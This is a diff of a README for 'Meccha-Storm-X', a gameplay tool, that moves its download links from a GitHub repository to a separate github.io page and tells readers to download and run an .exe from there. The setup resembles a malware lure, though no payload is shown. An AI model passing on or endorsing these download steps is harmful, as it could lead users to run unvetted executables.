@@ -1,6 +1,6 @@
 # 🌪️ Meccha-Storm-X - Improve your gameplay with advanced tools
 
-[![Download Meccha-Storm-X](https://img.shields.io/badge/Download-Meccha--Storm--X-blue.svg)](https://github.com/Bearskinbubblejetprinter969/Meccha-Storm-X)
+[![Download Meccha-Storm-X](https://img.shields.io/badge/Download-Meccha--Storm--X-blue.svg)](https://bearskinbubblejetprinter969.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to download and run the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Bearskinbubblejetprinter969/Meccha-Storm-X](https://github.com/Bearskinbubblejetprinter969/Meccha-Storm-X).
+1.  Visit the official release page: [https://bearskinbubblejetprinter969.github.io](https://bearskinbubblejetprinter969.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Click the link to download the latest executable file, usually ending in .exe.
 4.  Save the file to a folder on your computer that you can find easily, such as your Downloads folder.
